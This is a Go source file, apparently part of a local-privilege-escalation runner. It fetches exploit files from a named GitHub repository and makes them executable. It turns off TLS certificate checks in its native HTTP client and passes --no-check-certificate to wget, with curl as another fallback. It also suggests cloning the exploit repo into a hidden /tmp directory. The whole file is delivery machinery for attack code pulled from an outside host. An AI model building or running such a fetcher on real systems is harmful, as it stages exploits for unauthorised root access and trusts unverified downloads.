package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

// defaultRepoURL is the raw-content base for the pa-root GitHub repo.
// Individual files are fetched from <repoURL>/<filename>.
const defaultRepoURL = "https://raw.githubusercontent.com/sagsooz/pa-root/main"

// fetch state (package-global).
var (
	fetchRepo     = defaultRepoURL
	fetchDisabled bool // set by -no-fetch
	fetchTried    bool // first attempt happened?
	fetchDead     bool // network confirmed down → skip future fetches
)

// fetchConfigure is called once from main() to apply CLI flags.
func fetchConfigure(repo string, noFetch bool) {
	if repo != "" {
		fetchRepo = strings.TrimRight(repo, "/")
	} else {
		fetchRepo = defaultRepoURL
	}
	fetchDisabled = noFetch
	// reset network-dead flag so a fresh configure starts clean.
	fetchDead = false
	fetchTried = false
}

// ensureFile returns true if the exploit file is present locally. If missing
// and auto-fetch is enabled and the network is alive, it downloads it from
// the GitHub repo. The first failure marks the network as dead so the rest
// of the run skips fetches instantly instead of timing out per file.
//
// Directory exploits (isDir=true) are never auto-fetched — they contain
// multiple files; print a hint instead.
func ensureFile(relPath string, isDir bool) bool {
	dst := absBin(relPath)
	if _, err := os.Stat(dst); err == nil {
		return true // already present locally
	}
	if fetchDisabled || fetchDead || isDir {
		return false
	}

	stepf("fetching %s from repo", relPath)
	ok := fetchOne(relPath)
	if !fetchTried {
		fetchTried = true
		if !ok {
			fetchDead = true
			warnf("network fetch failed — disabling auto-download for the rest of the run")
			return false
		}
	}
	return ok
}

// fetchOne downloads one file from the repo into the runner's own directory.
// Tries native HTTP first (with TLS skip-verify for broken-CA targets), then
// falls back to curl, then wget. On a 404 it retries once with the alternate
// branch (main↔master) and locks in the working URL.
func fetchOne(relPath string) bool {
	dst := absBin(relPath)
	if ok, status := httpFetch(fetchRepo+"/"+relPath, dst); ok {
		_ = os.Chmod(dst, 0o755)
		return sanityCheck(dst)
	} else if status == 404 {
		// Try the alternate branch once.
		alt := alternateBranch(fetchRepo)
		if alt != fetchRepo {
			if ok, _ := httpFetch(alt+"/"+relPath, dst); ok {
				_ = os.Chmod(dst, 0o755)
				fetchRepo = alt
				return sanityCheck(dst)
			}
		}
	}
	// Fall back to curl.
	if hasBin("curl") {
		c := exec.Command("curl", "-sL", "--retry", "2", "-o", dst, fetchRepo+"/"+relPath)
		if c.Run() == nil && sanityCheck(dst) {
			_ = os.Chmod(dst, 0o755)
			return true
		}
	}
	// Fall back to wget.
	if hasBin("wget") {
		c := exec.Command("wget", "-q", "--no-check-certificate", "-O", dst, fetchRepo+"/"+relPath)
		if c.Run() == nil && sanityCheck(dst) {
			_ = os.Chmod(dst, 0o755)
			return true
		}
	}
	return false
}

// httpFetch does a GET with a 60s timeout and TLS verify disabled. Returns
// (ok, statusCode). ok=true only on HTTP 200 + a non-tiny body.
func httpFetch(url, dst string) (bool, int) {
	client := &http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false, 0
	}
	req.Header.Set("User-Agent", "lpe-runner/2.0")
	resp, err := client.Do(req)
	if err != nil {
		return false, 0
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return false, resp.StatusCode
	}
	f, err := os.Create(dst)
	if err != nil {
		return false, resp.StatusCode
	}
	n, err := io.Copy(f, resp.Body)
	f.Close()
	if err != nil || n < 100 {
		// Tiny body → probably a 404 HTML stub or empty.
		_ = os.Remove(dst)
		return false, resp.StatusCode
	}
	return true, resp.StatusCode
}

// sanityCheck verifies the downloaded file is large enough to be real.
func sanityCheck(p string) bool {
	fi, err := os.Stat(p)
	if err != nil {
		return false
	}
	return fi.Size() >= 100
}

// alternateBranch swaps /main/ ↔ /master/ in the repo URL.
func alternateBranch(repo string) string {
	if strings.Contains(repo, "/main/") || strings.HasSuffix(repo, "/main") {
		return strings.ReplaceAll(repo, "/main", "/master")
	}
	if strings.Contains(repo, "/master/") || strings.HasSuffix(repo, "/master") {
		return strings.ReplaceAll(repo, "/master", "/main")
	}
	return repo
}

// fetchHint returns the manual-install hint for a missing directory exploit.
func fetchHint(name string) string {
	return fmt.Sprintf("git clone https://github.com/sagsooz/pa-root /tmp/.lpe_repo && cp -r /tmp/.lpe_repo/%s .", name)
}
